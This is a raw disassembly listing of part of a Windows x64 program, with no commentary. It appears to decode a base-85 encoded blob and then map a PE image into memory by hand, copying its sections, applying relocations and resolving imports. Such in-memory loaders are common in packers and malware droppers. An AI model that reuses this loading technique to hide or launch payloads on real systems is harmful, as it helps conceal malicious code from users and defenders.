   140001e53:	0f b6 79 03          	movzbl 0x3(%rcx),%edi
   140001e57:	c1 e7 08             	shl    $0x8,%edi
   140001e5a:	0b f8                	or     %eax,%edi
   140001e5c:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   140001e61:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   140001e65:	0f 28 05 44 ee 00 00 	movaps 0xee44(%rip),%xmm0        # 0x140010cb0
   140001e6c:	c1 e7 08             	shl    $0x8,%edi
   140001e6f:	0b f8                	or     %eax,%edi
   140001e71:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   140001e76:	0f b6 01             	movzbl (%rcx),%eax
   140001e79:	33 c9                	xor    %ecx,%ecx
   140001e7b:	0f 28 0d 3e ee 00 00 	movaps 0xee3e(%rip),%xmm1        # 0x140010cc0
   140001e82:	c1 e7 08             	shl    $0x8,%edi
   140001e85:	0b f8                	or     %eax,%edi
   140001e87:	0f 29 44 24 50       	movaps %xmm0,0x50(%rsp)
   140001e8c:	f2 0f 10 05 3a ee 00 	movsd  0xee3a(%rip),%xmm0        # 0x140010cce
   140001e93:	00 
   140001e94:	66 0f 7e d0          	movd   %xmm2,%eax
   140001e98:	4c 89 bc 24 10 01 00 	mov    %r15,0x110(%rsp)
   140001e9f:	00 
   140001ea0:	44 8d 7a fc          	lea    -0x4(%rdx),%r15d
   140001ea4:	0f 29 4c 24 60       	movaps %xmm1,0x60(%rsp)
   140001ea9:	0f 29 54 24 20       	movaps %xmm2,0x20(%rsp)
   140001eae:	f2 0f 11 44 24 6e    	movsd  %xmm0,0x6e(%rsp)
   140001eb4:	84 c0                	test   %al,%al
   140001eb6:	74 28                	je     0x140001ee0
   140001eb8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001ebf:	00 
   140001ec0:	48 63 c1             	movslq %ecx,%rax
   140001ec3:	0f b6 54 04 20       	movzbl 0x20(%rsp,%rax,1),%edx
   140001ec8:	80 fa 80             	cmp    $0x80,%dl
   140001ecb:	73 07                	jae    0x140001ed4
   140001ecd:	88 8c 14 80 00 00 00 	mov    %cl,0x80(%rsp,%rdx,1)
   140001ed4:	ff c1                	inc    %ecx
   140001ed6:	48 63 c1             	movslq %ecx,%rax
   140001ed9:	80 7c 04 20 00       	cmpb   $0x0,0x20(%rsp,%rax,1)
   140001ede:	75 e0                	jne    0x140001ec0
   140001ee0:	45 33 c9             	xor    %r9d,%r9d
   140001ee3:	33 f6                	xor    %esi,%esi
   140001ee5:	45 85 ff             	test   %r15d,%r15d
   140001ee8:	0f 8e db 00 00 00    	jle    0x140001fc9
   140001eee:	48 89 9c 24 40 01 00 	mov    %rbx,0x140(%rsp)
   140001ef5:	00 
   140001ef6:	4c 89 a4 24 18 01 00 	mov    %r12,0x118(%rsp)
   140001efd:	00 
   140001efe:	41 bc 05 00 00 00    	mov    $0x5,%r12d
   140001f04:	44 3b cf             	cmp    %edi,%r9d
   140001f07:	0f 83 ac 00 00 00    	jae    0x140001fb9
   140001f0d:	45 8b d7             	mov    %r15d,%r10d
   140001f10:	44 2b d6             	sub    %esi,%r10d
   140001f13:	45 3b d4             	cmp    %r12d,%r10d
   140001f16:	45 0f 4d d4          	cmovge %r12d,%r10d
   140001f1a:	41 8b ca             	mov    %r10d,%ecx
   140001f1d:	83 e9 02             	sub    $0x2,%ecx
   140001f20:	74 2b                	je     0x140001f4d
   140001f22:	83 e9 01             	sub    $0x1,%ecx
   140001f25:	74 1e                	je     0x140001f45
   140001f27:	83 e9 01             	sub    $0x1,%ecx
   140001f2a:	74 11                	je     0x140001f3d
   140001f2c:	83 f9 01             	cmp    $0x1,%ecx
   140001f2f:	0f 85 84 00 00 00    	jne    0x140001fb9
   140001f35:	41 bb 04 00 00 00    	mov    $0x4,%r11d
   140001f3b:	eb 16                	jmp    0x140001f53
   140001f3d:	41 bb 03 00 00 00    	mov    $0x3,%r11d
   140001f43:	eb 0e                	jmp    0x140001f53
   140001f45:	41 bb 02 00 00 00    	mov    $0x2,%r11d
   140001f4b:	eb 06                	jmp    0x140001f53
   140001f4d:	41 bb 01 00 00 00    	mov    $0x1,%r11d
   140001f53:	45 8b c2             	mov    %r10d,%r8d
   140001f56:	8d 5e ff             	lea    -0x1(%rsi),%ebx
   140001f59:	33 c0                	xor    %eax,%eax
   140001f5b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001f60:	42 8d 0c 03          	lea    (%rbx,%r8,1),%ecx
   140001f64:	41 ff c8             	dec    %r8d
   140001f67:	48 63 d1             	movslq %ecx,%rdx
   140001f6a:	42 0f b6 4c 32 04    	movzbl 0x4(%rdx,%r14,1),%ecx
   140001f70:	80 f9 80             	cmp    $0x80,%cl
   140001f73:	73 0a                	jae    0x140001f7f
   140001f75:	0f b6 94 0c 80 00 00 	movzbl 0x80(%rsp,%rcx,1),%edx
   140001f7c:	00 
   140001f7d:	eb 02                	jmp    0x140001f81
   140001f7f:	33 d2                	xor    %edx,%edx
   140001f81:	48 6b c0 55          	imul   $0x55,%rax,%rax
   140001f85:	48 03 c2             	add    %rdx,%rax
   140001f88:	45 85 c0             	test   %r8d,%r8d
   140001f8b:	7f d3                	jg     0x140001f60
   140001f8d:	33 d2                	xor    %edx,%edx
   140001f8f:	45 85 db             	test   %r11d,%r11d
   140001f92:	74 19                	je     0x140001fad
   140001f94:	44 3b cf             	cmp    %edi,%r9d
   140001f97:	73 14                	jae    0x140001fad
   140001f99:	49 63 c9             	movslq %r9d,%rcx
   140001f9c:	ff c2                	inc    %edx
   140001f9e:	41 ff c1             	inc    %r9d
   140001fa1:	88 04 29             	mov    %al,(%rcx,%rbp,1)
   140001fa4:	48 c1 e8 08          	shr    $0x8,%rax
   140001fa8:	41 3b d3             	cmp    %r11d,%edx
   140001fab:	7c e7                	jl     0x140001f94
   140001fad:	41 03 f2             	add    %r10d,%esi
   140001fb0:	41 3b f7             	cmp    %r15d,%esi
   140001fb3:	0f 8c 4b ff ff ff    	jl     0x140001f04
   140001fb9:	48 8b 9c 24 40 01 00 	mov    0x140(%rsp),%rbx
   140001fc0:	00 
   140001fc1:	4c 8b a4 24 18 01 00 	mov    0x118(%rsp),%r12
   140001fc8:	00 
   140001fc9:	4c 8b bc 24 10 01 00 	mov    0x110(%rsp),%r15
   140001fd0:	00 
   140001fd1:	41 8b c1             	mov    %r9d,%eax
   140001fd4:	48 8b bc 24 20 01 00 	mov    0x120(%rsp),%rdi
   140001fdb:	00 
   140001fdc:	48 8b b4 24 48 01 00 	mov    0x148(%rsp),%rsi
   140001fe3:	00 
   140001fe4:	48 8b 8c 24 00 01 00 	mov    0x100(%rsp),%rcx
   140001feb:	00 
   140001fec:	48 33 cc             	xor    %rsp,%rcx
   140001fef:	e8 1c 11 00 00       	call   0x140003110
   140001ff4:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   140001ffb:	41 5e                	pop    %r14
   140001ffd:	5d                   	pop    %rbp
   140001ffe:	c3                   	ret
   140001fff:	e8 6c 10 00 00       	call   0x140003070
   140002004:	cc                   	int3
   140002005:	cc                   	int3
   140002006:	cc                   	int3
   140002007:	cc                   	int3
   140002008:	cc                   	int3
   140002009:	cc                   	int3
   14000200a:	cc                   	int3
   14000200b:	cc                   	int3
   14000200c:	cc                   	int3
   14000200d:	cc                   	int3
   14000200e:	cc                   	int3
   14000200f:	cc                   	int3
   140002010:	40 53                	rex push %rbx
   140002012:	55                   	push   %rbp
   140002013:	56                   	push   %rsi
   140002014:	57                   	push   %rdi
   140002015:	41 56                	push   %r14
   140002017:	48 83 ec 20          	sub    $0x20,%rsp
   14000201b:	48 63 da             	movslq %edx,%rbx
   14000201e:	49 8b e9             	mov    %r9,%rbp
   140002021:	49 8b f8             	mov    %r8,%rdi
   140002024:	48 8b f1             	mov    %rcx,%rsi
   140002027:	48 8b d3             	mov    %rbx,%rdx
   14000202a:	33 c9                	xor    %ecx,%ecx
   14000202c:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140002032:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140002038:	ff d5                	call   *%rbp
   14000203a:	4c 8b f0             	mov    %rax,%r14
   14000203d:	48 85 c0             	test   %rax,%rax
   140002040:	74 5a                	je     0x14000209c
   140002042:	4c 8b c0             	mov    %rax,%r8
   140002045:	8b d3                	mov    %ebx,%edx
   140002047:	48 8b ce             	mov    %rsi,%rcx
   14000204a:	e8 a1 f3 ff ff       	call   0x1400013f0
   14000204f:	8b d8                	mov    %eax,%ebx
   140002051:	85 c0                	test   %eax,%eax
   140002053:	7e 47                	jle    0x14000209c
   140002055:	8d 34 00             	lea    (%rax,%rax,1),%esi
   140002058:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   14000205e:	b8 00 01 00 00       	mov    $0x100,%eax
   140002063:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140002069:	3b f0                	cmp    %eax,%esi
   14000206b:	0f 4c f0             	cmovl  %eax,%esi
   14000206e:	33 c9                	xor    %ecx,%ecx
   140002070:	8b d6                	mov    %esi,%edx
   140002072:	ff d5                	call   *%rbp
   140002074:	48 8b e8             	mov    %rax,%rbp
   140002077:	48 85 c0             	test   %rax,%rax
   14000207a:	74 20                	je     0x14000209c
   14000207c:	44 8b ce             	mov    %esi,%r9d
   14000207f:	4c 8b c0             	mov    %rax,%r8
   140002082:	8b d3                	mov    %ebx,%edx
   140002084:	49 8b ce             	mov    %r14,%rcx
   140002087:	e8 54 fd ff ff       	call   0x140001de0
   14000208c:	89 07                	mov    %eax,(%rdi)
   14000208e:	48 8b c5             	mov    %rbp,%rax
   140002091:	48 83 c4 20          	add    $0x20,%rsp
   140002095:	41 5e                	pop    %r14
   140002097:	5f                   	pop    %rdi
   140002098:	5e                   	pop    %rsi
   140002099:	5d                   	pop    %rbp
   14000209a:	5b                   	pop    %rbx
   14000209b:	c3                   	ret
   14000209c:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   1400020a2:	33 c0                	xor    %eax,%eax
   1400020a4:	48 83 c4 20          	add    $0x20,%rsp
   1400020a8:	41 5e                	pop    %r14
   1400020aa:	5f                   	pop    %rdi
   1400020ab:	5e                   	pop    %rsi
   1400020ac:	5d                   	pop    %rbp
   1400020ad:	5b                   	pop    %rbx
   1400020ae:	c3                   	ret
   1400020af:	cc                   	int3
   1400020b0:	33 c0                	xor    %eax,%eax
   1400020b2:	c3                   	ret
   1400020b3:	cc                   	int3
   1400020b4:	cc                   	int3
   1400020b5:	cc                   	int3
   1400020b6:	cc                   	int3
   1400020b7:	cc                   	int3
   1400020b8:	cc                   	int3
   1400020b9:	cc                   	int3
   1400020ba:	cc                   	int3
   1400020bb:	cc                   	int3
   1400020bc:	cc                   	int3
   1400020bd:	cc                   	int3
   1400020be:	cc                   	int3
   1400020bf:	cc                   	int3
   1400020c0:	83 fa 40             	cmp    $0x40,%edx
   1400020c3:	0f 8c 96 06 00 00    	jl     0x14000275f
   1400020c9:	89 54 24 10          	mov    %edx,0x10(%rsp)
   1400020cd:	4c 8b dc             	mov    %rsp,%r11
   1400020d0:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   1400020d4:	55                   	push   %rbp
   1400020d5:	41 56                	push   %r14
   1400020d7:	48 83 ec 78          	sub    $0x78,%rsp
   1400020db:	48 8b e9             	mov    %rcx,%rbp
   1400020de:	44 8b f2             	mov    %edx,%r14d
   1400020e1:	8b 49 3c             	mov    0x3c(%rcx),%ecx
   1400020e4:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   1400020e8:	44 8d 49 18          	lea    0x18(%rcx),%r9d
   1400020ec:	44 3b ca             	cmp    %edx,%r9d
   1400020ef:	0f 87 63 06 00 00    	ja     0x140002758
   1400020f5:	80 3c 29 50          	cmpb   $0x50,(%rcx,%rbp,1)
   1400020f9:	0f 85 59 06 00 00    	jne    0x140002758
   1400020ff:	8d 41 01             	lea    0x1(%rcx),%eax
   140002102:	80 3c 28 45          	cmpb   $0x45,(%rax,%rbp,1)
   140002106:	0f 85 4c 06 00 00    	jne    0x140002758
   14000210c:	41 0f b7 04 29       	movzwl (%r9,%rbp,1),%eax
   140002111:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140002117:	49 89 5b e8          	mov    %rbx,-0x18(%r11)
   14000211b:	41 8b 5c 29 3c       	mov    0x3c(%r9,%rbp,1),%ebx
   140002120:	49 89 73 e0          	mov    %rsi,-0x20(%r11)
   140002124:	0f b7 74 29 06       	movzwl 0x6(%rcx,%rbp,1),%esi
   140002129:	49 89 7b d8          	mov    %rdi,-0x28(%r11)
   14000212d:	0f b7 7c 29 14       	movzwl 0x14(%rcx,%rbp,1),%edi
   140002132:	33 c9                	xor    %ecx,%ecx
   140002134:	4d 89 63 d0          	mov    %r12,-0x30(%r11)
   140002138:	4d 89 6b c8          	mov    %r13,-0x38(%r11)
   14000213c:	45 8b 6c 29 38       	mov    0x38(%r9,%rbp,1),%r13d
   140002141:	45 8b e1             	mov    %r9d,%r12d
   140002144:	41 8b d5             	mov    %r13d,%edx
   140002147:	66 89 84 24 a0 00 00 	mov    %ax,0xa0(%rsp)
   14000214e:	00 
   14000214f:	41 8b 44 29 10       	mov    0x10(%r9,%rbp,1),%eax
   140002154:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   14000215a:	4d 89 7b c0          	mov    %r15,-0x40(%r11)
   14000215e:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   140002163:	44 89 ac 24 a8 00 00 	mov    %r13d,0xa8(%rsp)
   14000216a:	00 
   14000216b:	89 44 24 34          	mov    %eax,0x34(%rsp)
   14000216f:	ff 15 4b c9 01 00    	call   *0x1c94b(%rip)        # 0x14001eac0
   140002175:	4c 8b f8             	mov    %rax,%r15
   140002178:	48 85 c0             	test   %rax,%rax
   14000217b:	0f 84 b9 05 00 00    	je     0x14000273a
   140002181:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   140002186:	33 d2                	xor    %edx,%edx
   140002188:	41 8d 48 18          	lea    0x18(%r8),%ecx
   14000218c:	03 cf                	add    %edi,%ecx
   14000218e:	89 4c 24 24          	mov    %ecx,0x24(%rsp)
   140002192:	85 db                	test   %ebx,%ebx
   140002194:	7e 13                	jle    0x1400021a9
   140002196:	41 3b d6             	cmp    %r14d,%edx
   140002199:	7d 0e                	jge    0x1400021a9
   14000219b:	0f b6 04 2a          	movzbl (%rdx,%rbp,1),%eax
   14000219f:	41 88 04 17          	mov    %al,(%r15,%rdx,1)
   1400021a3:	ff c2                	inc    %edx
   1400021a5:	3b d3                	cmp    %ebx,%edx
   1400021a7:	7c ed                	jl     0x140002196
   1400021a9:	45 33 f6             	xor    %r14d,%r14d
   1400021ac:	89 74 24 30          	mov    %esi,0x30(%rsp)
   1400021b0:	44 8b ce             	mov    %esi,%r9d
   1400021b3:	85 f6                	test   %esi,%esi
   1400021b5:	0f 84 83 00 00 00    	je     0x14000223e
   1400021bb:	44 8b a4 24 98 00 00 	mov    0x98(%rsp),%r12d
   1400021c2:	00 
   1400021c3:	43 8d 04 b6          	lea    (%r14,%r14,4),%eax
   1400021c7:	8d 0c c1             	lea    (%rcx,%rax,8),%ecx
   1400021ca:	48 03 cd             	add    %rbp,%rcx
   1400021cd:	8b 71 0c             	mov    0xc(%rcx),%esi
   1400021d0:	48 63 51 08          	movslq 0x8(%rcx),%rdx
   1400021d4:	8d 04 32             	lea    (%rdx,%rsi,1),%eax
   1400021d7:	41 3b c5             	cmp    %r13d,%eax
   1400021da:	77 4c                	ja     0x140002228
   1400021dc:	8b 59 10             	mov    0x10(%rcx),%ebx
   1400021df:	8b 79 14             	mov    0x14(%rcx),%edi
   1400021e2:	85 d2                	test   %edx,%edx
   1400021e4:	7e 13                	jle    0x1400021f9
   1400021e6:	4c 8b c2             	mov    %rdx,%r8
   1400021e9:	49 8d 0c 37          	lea    (%r15,%rsi,1),%rcx
   1400021ed:	33 d2                	xor    %edx,%edx
   1400021ef:	e8 0c cf 00 00       	call   0x14000f100
   1400021f4:	44 8b 4c 24 30       	mov    0x30(%rsp),%r9d
   1400021f9:	85 db                	test   %ebx,%ebx
   1400021fb:	74 2b                	je     0x140002228
   1400021fd:	8d 04 1f             	lea    (%rdi,%rbx,1),%eax
   140002200:	41 3b c4             	cmp    %r12d,%eax
   140002203:	77 23                	ja     0x140002228
   140002205:	45 33 c0             	xor    %r8d,%r8d
   140002208:	85 db                	test   %ebx,%ebx
   14000220a:	7e 1c                	jle    0x140002228
   14000220c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002210:	41 8d 04 38          	lea    (%r8,%rdi,1),%eax
   140002214:	0f b6 04 28          	movzbl (%rax,%rbp,1),%eax
   140002218:	41 8d 0c 30          	lea    (%r8,%rsi,1),%ecx
   14000221c:	41 ff c0             	inc    %r8d
   14000221f:	42 88 04 39          	mov    %al,(%rcx,%r15,1)
   140002223:	44 3b c3             	cmp    %ebx,%r8d
   140002226:	7c e8                	jl     0x140002210
   140002228:	8b 4c 24 24          	mov    0x24(%rsp),%ecx
   14000222c:	41 ff c6             	inc    %r14d
   14000222f:	45 3b f1             	cmp    %r9d,%r14d
   140002232:	7c 8f                	jl     0x1400021c3
   140002234:	4c 8b 64 24 28       	mov    0x28(%rsp),%r12
   140002239:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   14000223e:	0f b7 bc 24 a0 00 00 	movzwl 0xa0(%rsp),%edi
   140002245:	00 
   140002246:	ba 0b 02 00 00       	mov    $0x20b,%edx
   14000224b:	66 3b fa             	cmp    %dx,%di
   14000224e:	75 07                	jne    0x140002257
   140002250:	49 8b 44 2c 18       	mov    0x18(%r12,%rbp,1),%rax
   140002255:	eb 05                	jmp    0x14000225c
   140002257:	41 8b 44 2c 1c       	mov    0x1c(%r12,%rbp,1),%eax
   14000225c:	4d 8b cf             	mov    %r15,%r9
   14000225f:	4c 2b c8             	sub    %rax,%r9
   140002262:	0f 84 28 02 00 00    	je     0x140002490
   140002268:	66 3b fa             	cmp    %dx,%di
   14000226b:	b9 a0 00 00 00       	mov    $0xa0,%ecx
   140002270:	b8 b0 00 00 00       	mov    $0xb0,%eax
   140002275:	0f 45 c1             	cmovne %ecx,%eax
   140002278:	42 8d 0c 00          	lea    (%rax,%r8,1),%ecx
   14000227c:	8d 41 08             	lea    0x8(%rcx),%eax
   14000227f:	3b 84 24 98 00 00 00 	cmp    0x98(%rsp),%eax
   140002286:	0f 87 02 01 00 00    	ja     0x14000238e
   14000228c:	8b c1                	mov    %ecx,%eax
   14000228e:	8b 0c 29             	mov    (%rcx,%rbp,1),%ecx
   140002291:	85 c9                	test   %ecx,%ecx
   140002293:	0f 84 f5 00 00 00    	je     0x14000238e
   140002299:	8b 6c 28 04          	mov    0x4(%rax,%rbp,1),%ebp
   14000229d:	85 ed                	test   %ebp,%ebp
   14000229f:	0f 84 e1 00 00 00    	je     0x140002386
   1400022a5:	8d 04 29             	lea    (%rcx,%rbp,1),%eax
   1400022a8:	41 3b c5             	cmp    %r13d,%eax
   1400022ab:	0f 87 d5 00 00 00    	ja     0x140002386
   1400022b1:	45 33 db             	xor    %r11d,%r11d
   1400022b4:	83 fd 08             	cmp    $0x8,%ebp
   1400022b7:	0f 82 c9 00 00 00    	jb     0x140002386
   1400022bd:	44 8b f1             	mov    %ecx,%r14d
   1400022c0:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   1400022c5:	44 0f b7 e7          	movzwl %di,%r12d
   1400022c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400022d0:	41 8b fb             	mov    %r11d,%edi
   1400022d3:	49 03 fe             	add    %r14,%rdi
   1400022d6:	42 8b 5c 3f 04       	mov    0x4(%rdi,%r15,1),%ebx
   1400022db:	83 fb 08             	cmp    $0x8,%ebx
   1400022de:	0f 82 90 00 00 00    	jb     0x140002374
   1400022e4:	8b c5                	mov    %ebp,%eax
   1400022e6:	41 2b c3             	sub    %r11d,%eax
   1400022e9:	3b d8                	cmp    %eax,%ebx
   1400022eb:	0f 87 83 00 00 00    	ja     0x140002374
   1400022f1:	42 8b 34 3f          	mov    (%rdi,%r15,1),%esi
   1400022f5:	44 8d 53 f8          	lea    -0x8(%rbx),%r10d
   1400022f9:	41 d1 ea             	shr    $1,%r10d
   1400022fc:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140002302:	74 61                	je     0x140002365
   140002304:	41 be 0b 02 00 00    	mov    $0x20b,%r14d
   14000230a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002310:	43 8d 04 00          	lea    (%r8,%r8,1),%eax
   140002314:	8b c8                	mov    %eax,%ecx
   140002316:	48 03 cf             	add    %rdi,%rcx
   140002319:	42 0f b7 44 39 08    	movzwl 0x8(%rcx,%r15,1),%eax
   14000231f:	0f b7 d0             	movzwl %ax,%edx
   140002322:	25 ff 0f 00 00       	and    $0xfff,%eax
   140002327:	66 c1 ea 0c          	shr    $0xc,%dx
   14000232b:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx
   14000232e:	80 fa 0a             	cmp    $0xa,%dl
   140002331:	75 14                	jne    0x140002347
   140002333:	66 45 3b e6          	cmp    %r14w,%r12w
   140002337:	75 1f                	jne    0x140002358
   140002339:	8d 41 08             	lea    0x8(%rcx),%eax
   14000233c:	41 3b c5             	cmp    %r13d,%eax
   14000233f:	77 17                	ja     0x140002358
   140002341:	4e 01 0c 39          	add    %r9,(%rcx,%r15,1)
   140002345:	eb 11                	jmp    0x140002358
   140002347:	80 fa 03             	cmp    $0x3,%dl
   14000234a:	75 0c                	jne    0x140002358
   14000234c:	8d 41 04             	lea    0x4(%rcx),%eax
   14000234f:	41 3b c5             	cmp    %r13d,%eax
   140002352:	77 04                	ja     0x140002358
   140002354:	46 01 0c 39          	add    %r9d,(%rcx,%r15,1)
   140002358:	41 ff c0             	inc    %r8d
   14000235b:	45 3b c2             	cmp    %r10d,%r8d
   14000235e:	72 b0                	jb     0x140002310
   140002360:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140002365:	44 03 db             	add    %ebx,%r11d
   140002368:	41 8d 43 08          	lea    0x8(%r11),%eax
   14000236c:	3b c5                	cmp    %ebp,%eax
   14000236e:	0f 86 5c ff ff ff    	jbe    0x1400022d0
   140002374:	4c 8b 64 24 28       	mov    0x28(%rsp),%r12
   140002379:	ba 0b 02 00 00       	mov    $0x20b,%edx
   14000237e:	0f b7 bc 24 a0 00 00 	movzwl 0xa0(%rsp),%edi
   140002385:	00 
   140002386:	48 8b ac 24 90 00 00 	mov    0x90(%rsp),%rbp
   14000238d:	00 
   14000238e:	66 3b fa             	cmp    %dx,%di
   140002391:	75 0c                	jne    0x14000239f
   140002393:	4f 89 7c 3c 18       	mov    %r15,0x18(%r12,%r15,1)
   140002398:	b8 90 00 00 00       	mov    $0x90,%eax
   14000239d:	eb 0a                	jmp    0x1400023a9
   14000239f:	47 89 7c 3c 1c       	mov    %r15d,0x1c(%r12,%r15,1)
   1400023a4:	b8 80 00 00 00       	mov    $0x80,%eax
   1400023a9:	44 8b 74 24 20       	mov    0x20(%rsp),%r14d
   1400023ae:	8b b4 24 98 00 00 00 	mov    0x98(%rsp),%esi
   1400023b5:	41 8d 0c 06          	lea    (%r14,%rax,1),%ecx
   1400023b9:	8d 41 08             	lea    0x8(%rcx),%eax
   1400023bc:	3b c6                	cmp    %esi,%eax
   1400023be:	0f 87 a6 01 00 00    	ja     0x14000256a
   1400023c4:	44 8b 2c 29          	mov    (%rcx,%rbp,1),%r13d
   1400023c8:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   1400023cd:	45 85 ed             	test   %r13d,%r13d
   1400023d0:	0f 84 87 01 00 00    	je     0x14000255d
   1400023d6:	44 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%r8d
   1400023dd:	00 
   1400023de:	45 3b e8             	cmp    %r8d,%r13d
   1400023e1:	0f 83 80 01 00 00    	jae    0x140002567
   1400023e7:	41 8d 45 14          	lea    0x14(%r13),%eax
   1400023eb:	41 3b c0             	cmp    %r8d,%eax
   1400023ee:	0f 87 73 01 00 00    	ja     0x140002567
   1400023f4:	bf 08 00 00 00       	mov    $0x8,%edi
   1400023f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002400:	41 8b cd             	mov    %r13d,%ecx
   140002403:	42 8b 44 39 0c       	mov    0xc(%rcx,%r15,1),%eax
   140002408:	85 c0                	test   %eax,%eax
   14000240a:	0f 84 31 01 00 00    	je     0x140002541
   140002410:	41 3b c0             	cmp    %r8d,%eax
   140002413:	0f 83 28 01 00 00    	jae    0x140002541
   140002419:	42 8b 1c 39          	mov    (%rcx,%r15,1),%ebx
   14000241d:	46 8b 64 39 10       	mov    0x10(%rcx,%r15,1),%r12d
   140002422:	49 8d 0c 07          	lea    (%r15,%rax,1),%rcx
   140002426:	ff 15 84 c6 01 00    	call   *0x1c684(%rip)        # 0x14001eab0
   14000242c:	44 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%r8d
   140002433:	00 
   140002434:	48 8b e8             	mov    %rax,%rbp
   140002437:	48 85 c0             	test   %rax,%rax
   14000243a:	0f 84 eb 00 00 00    	je     0x14000252b
   140002440:	85 db                	test   %ebx,%ebx
   140002442:	41 8b cc             	mov    %r12d,%ecx
   140002445:	0f 45 cb             	cmovne %ebx,%ecx
   140002448:	85 c9                	test   %ecx,%ecx
   14000244a:	0f 84 db 00 00 00    	je     0x14000252b
   140002450:	41 3b c8             	cmp    %r8d,%ecx
   140002453:	0f 83 d2 00 00 00    	jae    0x14000252b
   140002459:	45 3b e0             	cmp    %r8d,%r12d
   14000245c:	0f 83 c9 00 00 00    	jae    0x14000252b
   140002462:	44 0f b7 ac 24 a0 00 	movzwl 0xa0(%rsp),%r13d
   140002469:	00 00 
   14000246b:	ba 0b 02 00 00       	mov    $0x20b,%edx
   140002470:	66 44 3b ea          	cmp    %dx,%r13w
   140002474:	44 8b f1             	mov    %ecx,%r14d
   140002477:	be 04 00 00 00       	mov    $0x4,%esi
   14000247c:	0f 44 f7             	cmove  %edi,%esi
   14000247f:	33 ff                	xor    %edi,%edi
   140002481:	4d 03 f7             	add    %r15,%r14
   140002484:	66 44 3b ea          	cmp    %dx,%r13w
   140002488:	75 19                	jne    0x1400024a3
   14000248a:	4a 8b 0c 37          	mov    (%rdi,%r14,1),%rcx
   14000248e:	eb 17                	jmp    0x1400024a7
   140002490:	66 3b fa             	cmp    %dx,%di
   140002493:	0f 85 0b ff ff ff    	jne    0x1400023a4
   140002499:	b8 90 00 00 00       	mov    $0x90,%eax
   14000249e:	e9 06 ff ff ff       	jmp    0x1400023a9
   1400024a3:	42 8b 0c 37          	mov    (%rdi,%r14,1),%ecx
   1400024a7:	48 85 c9             	test   %rcx,%rcx
   1400024aa:	74 75                	je     0x140002521
   1400024ac:	66 44 3b ea          	cmp    %dx,%r13w
   1400024b0:	b8 00 00 00 80       	mov    $0x80000000,%eax
   1400024b5:	48 ba 00 00 00 00 00 	movabs $0x8000000000000000,%rdx
   1400024bc:	00 00 80 
   1400024bf:	48 0f 44 c2          	cmove  %rdx,%rax
   1400024c3:	48 85 c1             	test   %rax,%rcx
   1400024c6:	74 05                	je     0x1400024cd
   1400024c8:	0f b7 d1             	movzwl %cx,%edx
   1400024cb:	eb 17                	jmp    0x1400024e4
   1400024cd:	0f ba f1 1f          	btr    $0x1f,%ecx
   1400024d1:	33 d2                	xor    %edx,%edx
   1400024d3:	8d 41 02             	lea    0x2(%rcx),%eax
   1400024d6:	41 3b c0             	cmp    %r8d,%eax
   1400024d9:	73 1d                	jae    0x1400024f8
   1400024db:	8b d1                	mov    %ecx,%edx
   1400024dd:	48 83 c2 02          	add    $0x2,%rdx
   1400024e1:	49 03 d7             	add    %r15,%rdx
   1400024e4:	48 8b cd             	mov    %rbp,%rcx
   1400024e7:	ff 15 cb c5 01 00    	call   *0x1c5cb(%rip)        # 0x14001eab8
   1400024ed:	44 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%r8d
   1400024f4:	00 
   1400024f5:	48 8b d0             	mov    %rax,%rdx
   1400024f8:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   1400024fd:	4a 8d 04 27          	lea    (%rdi,%r12,1),%rax
   140002501:	66 44 3b e9          	cmp    %cx,%r13w
   140002505:	75 0d                	jne    0x140002514
   140002507:	4a 89 14 38          	mov    %rdx,(%rax,%r15,1)
   14000250b:	03 fe                	add    %esi,%edi
   14000250d:	8b d1                	mov    %ecx,%edx
   14000250f:	e9 70 ff ff ff       	jmp    0x140002484
   140002514:	42 89 14 38          	mov    %edx,(%rax,%r15,1)
   140002518:	03 fe                	add    %esi,%edi
   14000251a:	8b d1                	mov    %ecx,%edx
   14000251c:	e9 63 ff ff ff       	jmp    0x140002484
   140002521:	44 8b 6c 24 28       	mov    0x28(%rsp),%r13d
   140002526:	bf 08 00 00 00       	mov    $0x8,%edi
   14000252b:	41 83 c5 14          	add    $0x14,%r13d
   14000252f:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140002534:	41 8d 45 14          	lea    0x14(%r13),%eax
   140002538:	41 3b c0             	cmp    %r8d,%eax
   14000253b:	0f 86 bf fe ff ff    	jbe    0x140002400
   140002541:	0f b7 bc 24 a0 00 00 	movzwl 0xa0(%rsp),%edi
   140002548:	00 
   140002549:	48 8b ac 24 90 00 00 	mov    0x90(%rsp),%rbp
   140002550:	00 
   140002551:	8b b4 24 98 00 00 00 	mov    0x98(%rsp),%esi
   140002558:	44 8b 74 24 20       	mov    0x20(%rsp),%r14d
   14000255d:	44 8b ac 24 a8 00 00 	mov    0xa8(%rsp),%r13d
   140002564:	00 
   140002565:	eb 03                	jmp    0x14000256a
